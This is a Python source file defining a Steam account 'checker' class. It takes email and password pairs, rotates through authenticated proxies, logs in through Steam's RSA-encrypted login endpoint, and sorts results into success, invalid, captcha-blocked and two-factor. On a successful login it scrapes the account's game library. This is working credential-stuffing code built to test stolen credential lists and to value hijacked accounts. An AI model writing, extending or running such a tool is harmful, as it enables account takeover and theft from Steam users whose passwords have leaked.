import requests
import json
import time
import re
from Cryptodome.PublicKey import RSA
from Cryptodome.Cipher import PKCS1_v1_5
import base64
import random
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime, timedelta

class SteamChecker:
    _rsa_cache = {}
    _session_pool = None
    _max_workers = 10

    @classmethod
    def init_session_pool(cls):
        if cls._session_pool is None:
            cls._session_pool = ThreadPoolExecutor(max_workers=cls._max_workers)

    def __init__(self, email, password):
        self.username = email
        self.password = password
        self.session = self._create_session()
        self.user_agent = "Mozilla/5.0 (iPhone; CPU iPhone OS 10_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/497.322 Mobile/15A302 Safari/604.1"
        
        self.proxies = [
            "USER:PASS@IP:PORT",
            "USER:PASS@IP:PORT",
            "USER:PASS@IP:PORT"
        ]
        self.set_random_proxy()
        SteamChecker.init_session_pool()

    def _create_session(self):
        session = requests.Session()
        
        retry_strategy = Retry(
            total=3,
            backoff_factor=0.5,
            status_forcelist=[429, 500, 502, 503, 504],
        )
        
        adapter = HTTPAdapter(max_retries=retry_strategy, pool_connections=20, pool_maxsize=20)
        session.mount("http://", adapter)
        session.mount("https://", adapter)
        
        return session

    def set_random_proxy(self):
        proxy = random.choice(self.proxies)
        proxy_parts = proxy.split(':')
        host = proxy_parts[0]
        port = proxy_parts[1]
        username = proxy_parts[2]
        password = proxy_parts[3]
        
        formatted_proxy = {
            'http': f'http://{username}:{password}@{host}:{port}',
            'https': f'http://{username}:{password}@{host}:{port}'
        }
        self.session.proxies.update(formatted_proxy)

    def get_cached_rsa_key(self, username):
        """Get RSA key from cache or fetch new one"""
        current_time = datetime.now()
        cache_key = username.lower()
        
        if cache_key in self._rsa_cache:
            cached_data = self._rsa_cache[cache_key]
            if current_time - cached_data['timestamp'] < timedelta(seconds=60):
                return cached_data['data']
        
        return None

    def encrypt_password(self, mod, exp, password):
        try:
            mod = int(mod, 16)
            exp = int(exp, 16)
            
            key = RSA.construct((mod, exp))
            
            cipher = PKCS1_v1_5.new(key)
            
            encrypted = cipher.encrypt(password.encode())
            
            return base64.b64encode(encrypted).decode()
        except Exception as e:
            raise Exception(f"Failed to encrypt password: {str(e)}")
    
    def get_games(self, steam_id):
        """Get list of games for a Steam account"""
        try:
            headers = {
                "User-Agent": self.user_agent,
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Accept-Language": "en-us",
                "Accept-Encoding": "gzip, deflate, br"
            }
            
            response = self.session.get(
                f"https://steamcommunity.com/profiles/{steam_id}/games?tab=all",
                headers=headers,
                timeout=30
            )
            
            if response.status_code != 200:
                return {"games": [], "total_games": 0}
            
            content = response.text
            
            games = re.findall(r';name&quot;:&quot;(.*?)&quot;', content)
            
            games_str = " | ".join(games) if games else ""
            
            is_free = len(games) == 0
            
            return {
                "games": games_str,
                "total_games": len(games),
                "is_free": is_free
            }
        except Exception as e:
            return {"games": [], "total_games": 0, "is_free": True}

    def check_account(self):
        try:
            username = re.sub(r'@.*', '', self.username)
            
            rsa_data = self.get_cached_rsa_key(username)
            
            if not rsa_data:
                headers = {
                    "Accept": "*/*",
                    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                    "Origin": "https://steamcommunity.com",
                    "X-Requested-With": "XMLHttpRequest",
                    "User-Agent": self.user_agent,
                    "Accept-Encoding": "gzip, deflate, br",
                    "Accept-Language": "en-us"
                }
                
                timestamp = int(time.time())
                data = {
                    "donotcache": timestamp,
                    "username": username
                }
                
                response = self.session.post(
                    "https://steamcommunity.com/login/getrsakey/",
                    headers=headers,
                    data=data,
                    timeout=30
                )
                
                if response.status_code != 200:
                    return {"status": "FAILURE", "message": f"RSA key request failed with status code: {response.status_code}"}
                
                rsa_data = response.json()
                if not rsa_data.get("success"):
                    return {"status": "BAN", "message": "Failed to get RSA key"}
                
                self._rsa_cache[username.lower()] = {
                    'data': rsa_data,
                    'timestamp': datetime.now()
                }
            
            mod = rsa_data.get("publickey_mod")
            exp = rsa_data.get("publickey_exp")
            rsa_timestamp = rsa_data.get("timestamp")
            
            if not all([mod, exp, rsa_timestamp]):
                return {"status": "FAILURE", "message": "Missing RSA key components"}
            
            encrypted_password = self.encrypt_password(mod, exp, self.password)
            
            timestamp = int(time.time())
            login_data = {
                "donotcache": timestamp,
                "password": encrypted_password,
                "username": username,
                "twofactorcode": "",
                "emailauth": "",
                "loginfriendlyname": "",
                "captchagid": -1,
                "captcha_text": "",
                "emailsteamid": "",
                "rsatimestamp": rsa_timestamp,
                "remember_login": "false",
                "oauth_client_id": "3638BFB1"
            }
            
            headers["Referer"] = "https://steamcommunity.com/mobilelogin?oauth_client_id=3638BFB1&oauth_scope=read_profile%20write_profile%20read_client%20write_client"
            
            response = self.session.post(
                "https://steamcommunity.com/login/dologin/",
                headers=headers,
                data=login_data,
                timeout=30
            )
            
            if response.status_code != 200:
                return {"status": "FAILURE", "message": f"Login request failed with status code: {response.status_code}"}
            
            result = response.json()
            
            if "captcha_needed" in result and result["captcha_needed"]:
                return {"status": "BAN", "message": "Captcha required"}
                
            if any(msg in str(result) for msg in [
                "The account name or password that you have entered is incorrect",
                "Incorrect account name or password."
            ]):
                return {"status": "FAILURE", "message": "Invalid credentials"}
                
            if result.get("requires_twofactor", False) or result.get("emailauth_needed", False):
                return {"status": "2FACTOR", "message": "2FA required"}
                
            if result.get("success", False):
                steam_id = result.get("steamid")
                
                games_info = self.get_games(steam_id)
                
                return {
                    "status": "SUCCESS",
                    "username": username,
                    "steam_id": steam_id,
                    "games": games_info["games"],
                    "total_games": games_info["total_games"],
                    "is_free": games_info["is_free"]
                }
            
            return {"status": "FAILURE", "message": "Unknown error"}
            
        except requests.RequestException as e:
            return {"status": "FAILURE", "message": f"Network error: {str(e)}"}
        except Exception as e:
            return {"status": "FAILURE", "message": f"Error: {str(e)}"} 
